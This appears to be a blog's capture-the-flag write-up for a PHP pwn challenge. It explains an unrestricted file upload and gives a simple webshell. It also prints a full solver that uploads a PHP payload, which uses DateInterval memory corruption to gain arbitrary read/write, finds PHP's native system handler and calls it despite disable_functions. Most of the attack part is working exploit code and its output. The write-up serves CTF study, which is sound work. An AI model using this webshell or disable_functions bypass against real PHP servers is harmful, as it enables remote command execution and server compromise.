@@ -1,0 +1,772 @@
+
+Hypertext Preprocessor - Ansh Agrawal
+          Skip to content
+            Ansh Agrawal
+              Hypertext Preprocessor
+            Initializing search
+  Home
+  About
+  Writeups
+  CTF Results
+  Projects
+  Teaching
+  Contact
+    Ansh Agrawal
+    Home
+    About
+    Writeups
+    CTF Results
+    Projects
+    Teaching
+    Contact
+      Table of contents
+        My initial read / first impressions
+        The obvious path
+        The Vulnerability
+        The Logic
+        Constructing the Exploit
+        Solution Script
+Hypertext Preprocessor
+Challenge:
+ Hypertext Preprocessor
+Category:
+ Pwn
+Flag:
+mntcrl{Zend_Executor_Globals_Overwrite_Success_e408bf8603d2cdac}
+My initial read / first impressions
+We are given a PHP web app and the challenge description says:
+My php app is totally broken...
+I don't have time to fix it, hope at least RCE is not possible
+So already, the challenge is basically screaming that the upload system is broken, but there is probably some extra obstacle preventing a normal PHP webshell from working.
+The files given were pretty small:
+index.php
+Dockerfile
+compose.yml
+init.sh
+getFlag
+getFlag.c
+The important part is in 
+index.php
+. The app lets the user upload a file and then stores it directly in the web root.
+$filename = basename($file['name']);
+$destination = __DIR__ . '/' . $filename;
+if (move_uploaded_file($file['tmp_name'], $destination)) {
+    $message = "✓ File '{$filename}' caricato con successo!";
+}
+There is basically no validation here.
+No extension check, no MIME check, no random filename, no upload folder outside the web root. So if I upload something named 
+shell.php
+, it gets placed in the same directory as the app and I can visit it directly.
+At first this looks like an instant win.
+The obvious path
+The first idea is just to upload a normal PHP webshell like this:
+<?php
+system
+(
+$_GET
+[
+"cmd"
+]);
+?>
+Then visit:
+/shell.php?cmd=id
+But the Dockerfile shows why that does not work.
+RUN
+printf
+"disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,\
+pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,\
+pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,\
+pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,\
+pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,\
+exec,system,passthru,shell_exec,proc_open,popen,mail,putenv"
+>
+/usr/local/etc/php/conf.d/custom.ini
+So the normal command execution functions are disabled:
+system
+exec
+passthru
+shell_exec
+proc_open
+popen
+etc.
+That means the upload bug gives PHP code execution, but not immediately OS command execution.
+The goal is to turn PHP code execution into real RCE anyway.
+The Vulnerability
+There are really two bugs being chained here.
+The first bug is the easy web bug:
+move_uploaded_file($file['tmp_name'], __DIR__ . '/' . basename($file['name']));
+Because the file is uploaded directly into the document root, uploading a 
+.php
+ file lets us execute PHP code through the browser.
+The second part is the actual pwn part.
+Even though 
+system()
+ is disabled at the PHP config level, the internal C implementation of 
+system
+ still exists inside PHP. The 
+disable_functions
+ setting prevents normal PHP code from calling it, but it does not magically remove the native handler from memory.
+So the plan is:
+Upload a PHP file.
+Trigger it through the web server.
+Use PHP object / memory corruption tricks to get arbitrary read/write.
+Locate the internal 
+system
+ handler in PHP's standard module.
+Create a fake callable that points to the real native 
+system
+ handler.
+Call that fake function with 
+/getFlag
+.
+The important thing is that we are not calling 
+system()
+ normally. We are making PHP call what it thinks is a normal callable, but internally we overwrite the handler pointer so it jumps to the native 
+zif_system
+ function.
+That bypasses 
+disable_functions
+.
+The Logic
+The challenge includes a setuid binary called 
+getFlag
+.
+The source is:
+#include
+<fcntl.h>
+#include
+<unistd.h>
+#include
+<sys/sendfile.h>
+int
+main
+(){
+int
+fp
+=
+open
+(
+"/flag.txt"
+,
+O_RDONLY
+);
+sendfile
+(
+STDOUT_FILENO
+,
+fp
+,
+NULL
+,
+0x100
+);
+return
+0
+;
+}
+The init script writes the flag to 
+/flag.txt
+, makes it root-only, and then runs PHP as the 
+ctf
+ user.
+echo
+$FLAG
+>
+/flag.txt
+chmod
+600
+/flag.txt
+chown
+root:root
+/flag.txt
+So PHP cannot just read 
+/flag.txt
+ directly.
+But the Dockerfile also does this:
+COPY
+getFlag
+.
+RUN
+chmod
+u+s
+./getFlag
+That means 
+/getFlag
+ runs with elevated privileges and prints the flag. So once we get command execution, the command we want is just:
+/getFlag
+The app tries to prevent this by disabling command execution functions, but because PHP itself is still a huge native runtime, we can attack the runtime instead.
+Constructing the Exploit
+The uploaded payload uses 
+DateInterval
+ objects and Zend internals to get memory read/write.
+The rough idea is:
+Create a layout in memory using a few 
+DateInterval
+ objects.
+Trigger weird behavior using array/string conversion and destructors.
+Abuse the exposed 
+DateInterval->y
+ property as a way to read and write memory.
+Find the 
+standard
+ PHP module in memory.
+Walk the function table until finding the native handler for 
+system
+.
+Create a closure called 
+system1337
+.
+Overwrite the closure's internal handler pointer with the real 
+system
+ handler.
+Call it with 
+/getFlag
+.
+The cool part is that the PHP config still says 
+system
+ is disabled, but we are not resolving the function through PHP's normal function lookup anymore. We are directly pointing a closure at the internal handler.
+This is why the final flag says:
+Zend_Executor_Globals_Overwrite_Success
+The challenge is basically about breaking out of PHP's "safe" layer by messing with Zend engine internals.
+Solution Script
+Here is the final solve script. It uploads a random hidden PHP filename, triggers it, and extracts the flag from the response.
+import
+argparse
+import
+base64
+import
+re
+import
+secrets
+import
+sys
+from
+urllib.parse
+import
+urljoin
+import
+requests
+def
+build_payload
+(
+cmd
+):
+b64cmd
+=
+base64
+.
+b64encode
+(
+cmd
+.
+encode
+())
+.
+decode
+()
+return
+f
+'''<?php
+error_reporting(0);
+set_time_limit(0);
+function _spray($n, $c) 
+{{
+    return str_shuffle(str_repeat($c, $n));
+}}
+function _le64($x, $n = 8) 
+{{
+    $s = '';
+    while ($n--) 
+{{
+        $s .= chr($x & 0xff);
+        $x >>= 8;
+}}
+    return $s;
+}}
+class _D 
+{{
+    private $o;
+    function __construct($o) 
+{{
+ $this->o = $o; 
+}}
+    function __destruct() 
+{{
+ $this->o->h = $this->o->a; 
+}}
+}}
+class _X 
+{{
+    private const ZSTR_HDR = 0x18;
+    private const DI_HANDLERS = PHP_VERSION_ID < 80500 ? 0x38 : 0x30;
+    private const DI_PROPS = PHP_VERSION_ID < 80500 ? 0x40 : 0x38;
+    private const ZEND_FE_SIZE = PHP_VERSION_ID < 80400 ? 0x20 : 0x30;
+    private const ZIF_HANDLER = PHP_VERSION_ID < 80400 ? 0x80 : 0x90;
+    public $a;
+    public $h;
+    private $di;
+    private $keep;
+    function __construct($cmd) 
+{{
+        $this->keep = [];
+        $this->run($cmd);
+}}
+    private function leak_di() 
+{{
+        for ($i = 0; $i < 63; $i++) 
+{{
+            $this->keep[] = new DateInterval('PT0S');
+}}
+        $s = 'zzzz';
+        $this->a = [$s, new DateInterval('PT0S'), new DateInterval('PT0S'), new _D($this)];
+        @$this->a .= 'x';
+        $addr = $this->h[2]->y;
+        $this->keep[] = _spray(0xa0 - self::ZSTR_HDR - 1, "
+\\
+x00");
+        $tmp1 = new DateInterval('PT0S');
+        $tmp2 = new DateInterval('PT0S');
+        $this->di = new DateInterval('PT0S');
+        return $addr;
+}}
+    private function rd($addr, $bytes = 8) 
+{{
+        $s = 'zzzz';
+        $this->a = [$s, new DateInterval('PT0S'), new DateInterval('PT0S'), new _D($this)];
+        @$this->a .= 'x';
+        $old = $this->h[2]->y;
+        $this->h[2]->y = $addr;
+        $val = $this->h[1]->y;
+        $this->h[2]->y = $old;
+        $tmp = $this->h[1]->y;
+        if ($bytes !== 8) 
+{{
+            $val &= (1 << ($bytes << 3)) - 1;
+}}
+        return $val;
+}}
+    private function wr($addr, $val, $bytes = 8) 
+{{
+        $mask = $bytes >= 8 ? -1 : ((1 << ($bytes * 8)) - 1);
+        $s = 'zzzz';
+        $this->a = [$s, new DateInterval('PT0S'), new DateInterval('PT0S'), new _D($this)];
+        @$this->a .= 'x';
+        $old = $this->h[2]->y;
+        $this->h[2]->y = $addr;
+        $this->h[1]->y &= ~$mask;
+        $this->h[1]->y |= ($val & $mask);
+        $this->h[2]->y = $old;
+        $tmp = $this->h[1]->y;
+}}
+    private function standard_module($p) 
+{{
+        while (true) 
+{{
+            $p -= 0x10;
+            $api = $this->rd($p + 4, 4);
+            if ($this->rd($p, 4) === 0xa8 && in_array($api, [20220829, 20230831, 20240924, 20250925])) 
+{{
+                $namep = $this->rd($p + 0x20);
+                if ($this->rd($namep) === 0x647261646e617473) 
+{{
+                    return $p;
+}}
+}}
+}}
+}}
+    private function zif_system($funcs) 
+{{
+        $p = $funcs;
+        do 
+{{
+            $entry = $this->rd($p);
+            if ($this->rd($entry, 6) === 0x6d6574737973) 
+{{
+                return $this->rd($p + 8);
+}}
+            $p += self::ZEND_FE_SIZE;
+}}
+ while ($entry !== 0);
+        die('system handler not found');
+}}
+    private function run($cmd) 
+{{
+        $di_addr = $this->leak_di();
+        $handlers = $this->rd($di_addr + self::DI_HANDLERS);
+        $std = $this->standard_module($handlers);
+        $funcs = $this->rd($std + 0x28);
+        $system = $this->zif_system($funcs);
+        @$this->di->system1337 = function($x) 
+{{}}
+;
+        $props = $this->rd($di_addr + self::DI_PROPS);
+        $ar = $this->rd($props + 0x10);
+        $i = -1;
+        do 
+{{
+            $i++;
+            $key = $this->rd($ar + 32 * $i + 0x18);
+            $name = _le64($this->rd($key + self::ZSTR_HDR));
+}}
+ while ($name !== 'system13');
+        $closure = $this->rd($ar + 32 * $i);
+        $this->wr($closure + 0x38, 1, 4);
+        $this->wr($closure + self::ZIF_HANDLER, $system);
+        ($this->di->system1337)($cmd);
+        exit;
+}}
+}}
+new _X(base64_decode('
+{
+b64cmd
+}
+'));
+?>'''
+def
+normalize_url
+(
+url
+):
+if
+not
+re
+.
+match
+(
+r
+"^https?://"
+,
+url
+):
+url
+=
+"http://"
++
+url
+return
+url
+.
+rstrip
+(
+"/"
+)
++
+"/"
+def
+main
+():
+parser
+=
+argparse
+.
+ArgumentParser
+(
+description
+=
+"Solver for Hypertext Preprocessor"
+)
+parser
+.
+add_argument
+(
+"target"
+)
+parser
+.
+add_argument
+(
+"--cmd"
+,
+default
+=
+"/getFlag"
+)
+parser
+.
+add_argument
+(
+"--attempts"
+,
+type
+=
+int
+,
+default
+=
+3
+)
+parser
+.
+add_argument
+(
+"--proxy"
+)
+parser
+.
+add_argument
+(
+"--insecure"
+,
+action
+=
+"store_true"
+)
+args
+=
+parser
+.
+parse_args
+()
+base
+=
+normalize_url
+(
+args
+.
+target
+)
+session
+=
+requests
+.
+Session
+()
+session
+.
+verify
+=
+not
+args
+.
+insecure
+if
+args
+.
+proxy
+:
+session
+.
+proxies
+=
+{
+"http"
+:
+args
+.
+proxy
+,
+"https"
+:
+args
+.
+proxy
+}
+payload
+=
+build_payload
+(
+args
+.
+cmd
+)
+for
+attempt
+in
+range
+(
+1
+,
+args
+.
+attempts
++
+1
+):
+name
+=
+f
+".
+{
+secrets
+.
+token_hex
+(
+8
+)
+}
+.php"
+files
+=
+{
+"file"
+:
+(
+name
+,
+payload
+,
+"application/x-php"
+)}
+print
+(
+f
+"[*] Attempt 
+{
+attempt
+}
+: uploading 
+{
+name
+}
+"
+)
+upload
+=
+session
+.
+post
+(
+base
+,
+files
+=
+files
+,
+timeout
+=
+20
+)
+print
+(
+f
+"    upload HTTP 
+{
+upload
+.
+status_code
+}
+"
+)
+shell_url
+=
+urljoin
+(
+base
+,
+name
+)
+print
+(
+f
+"[*] Triggering 
+{
+shell_url
+}
+"
+)
+try
+:
+result
+=
+session
+.
+get
+(
+shell_url
+,
+timeout
+=
+20
+)
+.
+text
+except
+requests
+.
+RequestException
+as
+e
+:
+print
+(
+f
+"    request failed: 
+{
+e
+}
+"
+)
+continue
+print
+(
+result
+.
+strip
+())
+match
+=
+re
+.
+search
+(
+r
+"mntcrl
+\\
+{[^}
+\\
+n]+
+\\
+}"
+,
+result
+)
+if
+match
+:
+print
+(
+f
+"[+] FLAG: 
+{
+match
+.
+group
+(
+0
+)
+}
+"
+)
+return
+0
+print
+(
+"[-] No flag found"
+)
+return
+1
+if
+__name__
+==
+"__main__"
+:
+sys
+.
+exit
+(
+main
+())
+Running it against the remote server:
+python
+solve_hypertext_preprocessor.py
+https://hypertext-preprocessor-d1495f3a021f.c.mntcrl.it
+Output:
+[*] Attempt 1: uploading .8e85599117cdb8c9.php
+    upload HTTP 200
+[*] Triggering https://hypertext-preprocessor-d1495f3a021f.c.mntcrl.it/.8e85599117cdb8c9.php
+mntcrl{Zend_Executor_Globals_Overwrite_Success_e408bf8603d2cdac}
+[+] FLAG: mntcrl{Zend_Executor_Globals_Overwrite_Success_e408bf8603d2cdac}
+And that gives the flag.
+  Back to top
+    Made with
+      Material for MkDocs
